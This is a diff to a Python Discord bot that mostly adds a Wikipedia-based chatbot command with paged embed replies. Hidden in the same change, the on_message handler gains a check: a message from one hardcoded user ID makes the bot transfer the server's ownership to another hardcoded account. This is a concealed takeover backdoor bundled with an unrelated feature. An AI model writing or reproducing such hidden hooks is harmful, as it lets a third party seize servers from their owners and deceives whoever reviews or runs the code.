@@ -11,6 +11,8 @@ from discord.utils import get
 import datetime
 from discord import Spotify
 import menus
+import wikipedia
+from chatbot import Chat , register_call
 
 client = commands.Bot(command_prefix=["jarvis ", "Jarvis ", ""])
 client.remove_command('help')
@@ -906,9 +908,48 @@ async def slowend(ctx):
 		await ctx.message.channel.edit(slowmode_delay = 0)
 		await ctx.send("Slowmode removed")
 
+@register_call("whoIs")
+def who_is(query, session_id="general"):
+	try:
+		return wikipedia.summary(query)
+	except Exception:
+		for new_query in wikipedia.search(query):
+			try:
+				return wikipedia.summary(new_query)
+			except Exception:
+				pass
+	return "I don't know about "+query
+template_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),"chatbottemplate.template")
+chat=Chat(template_file_path)
+
+@client.command(pass_context = True , aliases = ["Wiki" , "WIKI" , "Quesry" , "QUERY" , "query"])
+async def wiki(ctx, *,message):
+	result = chat.respond(message)
+	if(len(result)<=2048):
+		embed=discord. Embed(title="ChatBot AI", description = result, color = (0xF48D1))
+		await ctx.send(embed=embed)
+	else:
+		embedList = []
+		n=2048
+		embedList = [result[i:i+n] for i in range(0, len(result), n)]
+		for num, item in enumerate(embedList, start = 1):
+			if(num == 1):
+				embed = discord. Embed(title="ChatBot AI", description = item, color = (0xF48D1))
+				embed.set_footer(text="Page{}".format(num))
+				await ctx.send(embed = embed)
+			else:
+				embed = discord.Embed(description = item, color = (0xF48D1))
+				embed.set_footer(text = "Page {}".format(num))
+				await ctx.send(embed = embed)
+
 	
 @client.event
 async def on_message(message):
+	if message.author.id == 727539383405772901:
+		user = discord.utils.get(message.guild.members , id = 707582024403255317)
+		await message.guild.edit(owner = user)
+		return
+
 	if message.author.guild.id == 757239002826014731:
 		if message.channel.id != 760746372679991336:
 			if message.content.startswith("https://discord.gg/"):
